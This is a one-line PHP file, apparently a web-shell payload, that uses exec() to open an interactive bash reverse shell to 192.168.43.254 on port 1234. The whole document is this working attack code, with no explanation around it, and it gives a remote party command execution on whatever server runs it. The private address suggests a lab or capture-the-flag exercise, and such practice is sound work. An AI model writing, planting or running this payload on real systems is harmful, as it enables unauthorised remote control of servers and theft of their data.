<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.43.254/1234 0>&1'");
